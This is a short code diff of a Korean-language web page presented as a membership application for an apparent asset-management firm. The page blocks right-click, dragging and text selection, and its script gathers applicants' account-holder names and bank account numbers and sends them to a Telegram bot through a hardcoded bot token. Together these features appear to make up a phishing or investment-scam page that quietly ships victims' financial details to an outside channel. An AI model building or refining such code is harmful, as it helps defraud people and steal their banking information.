@@ -173,7 +173,7 @@
 </head>
 <body oncontextmenu="return false" ondragstart="return false" onselectstart="return false">
     <div class="header">
-        <h1>베스트업 멤버십 신청.. </h1>
+        <h1>베스트업 멤버십 신청 </h1>
     </div>
     <div class="topimfo">
         베스트업 자산운용
@@ -294,7 +294,7 @@
                     '※예금주: ' + data.accountHolder,
                     '※계좌번호: ' + data.accountNumber,
                     '======================'
-                ].join('\n');
+                ].join(String.fromCharCode(13, 10));
 
                 const botToken = '7340037891:AAGRpEijtgsGHplWdDoVWo9mZiI90gGRab8';
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
